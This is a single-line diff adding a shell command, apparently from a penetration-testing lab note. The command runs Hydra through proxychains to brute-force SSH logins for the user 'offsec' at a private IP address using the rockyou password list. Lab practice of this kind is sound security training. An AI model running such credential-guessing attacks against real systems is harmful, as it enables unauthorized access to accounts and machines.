@@ -1,0 +1,1 @@
+sudo proxychains hydra -l offsec -P /usr/share/wordlists/rockyou.txt ssh://172.16.246.14
